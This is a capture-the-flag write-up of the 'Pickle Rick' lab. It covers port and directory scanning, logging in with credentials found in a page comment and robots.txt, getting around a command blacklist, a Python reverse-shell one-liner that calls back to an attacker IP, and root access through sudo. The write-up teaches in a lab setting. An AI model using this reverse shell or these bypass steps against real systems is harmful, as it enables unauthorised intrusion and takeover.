# Pickle Rick



## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open 10.10.55.99 -oN port_scan.txt          

Nmap scan report for 10.10.55.99
Host is up (0.035s latency).
Not shown: 65524 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumeration

<figure><img src="../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

First and foremost, intercept the web requests with Burp Suite to analyze if there is anything unusual.

<figure><img src="../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

We can see a comment with a user.

```
Username: R1ckRul3s
```



### Dir/File Enum

Check if there is some juicy file using gobuster tool.

{% code title="Directories" overflow="wrap" %}
```bash
gobuster dir -u http://10.10.55.99/ -w /usr/share/wordlists/SecLists_custom/raft-large-directories.txt -b 403,404

/assets               (Status: 301) [Size: 311] [--> http://10.10.55.99/assets/]
```
{% endcode %}

{% code title="Files" overflow="wrap" %}
```bash
gobuster dir -u http://10.10.55.99/ -w /usr/share/wordlists/SecLists_custom/raft-large-files.txt -b 403,404

/login.php            (Status: 200) [Size: 882]
/index.html           (Status: 200) [Size: 1062]
/robots.txt           (Status: 200) [Size: 17]
/.                    (Status: 200) [Size: 1062]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]

```
{% endcode %}

We have discovered the robots.txt that contain this string:

```
Wubbalubbadubdub
```

And a `login.php` page.

Try to login with user and possible password in robots.txt found.

<figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

We are in!



## Initial Access

Now, we have a Command Panel that allow us to execute some command to Web Server machine.

<figure><img src="../../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

`ls` command works but when we will trying to print a file with `cat` command the portal gives me a error contains "Command disable".

This error suggests us that there is a Black List of commands. We have to search an alternative to print a file, the command `less` can help us.

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

This command bypasses the Black List to read a file.

{% code title="flag1" %}
```
mr. meeseek hair
```
{% endcode %}



### Spawn Rev Shell

Making this request we can obtain a reverse shell

{% code title="Payload" overflow="wrap" %}
```python
export RHOST="10.23.52.142";export RPORT=9009;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



We can found a second flag in the rick's home directory

```bash
cd /home/rick
cat 'second ingredients'

1 jerry tear
```



## Privilege Escalation

Run `linpeass.sh` to find misconfiguration.

```bash
sudo -l

User www-data may run the following commands on ip-10-10-255-84:
    (ALL) NOPASSWD: ALL
```

With this rights we can access as root in easy way

```bash
sudo su
```

And print the last flag

```bash
cat /root/3rd.txt

3rd ingredients: fleeb juice
```



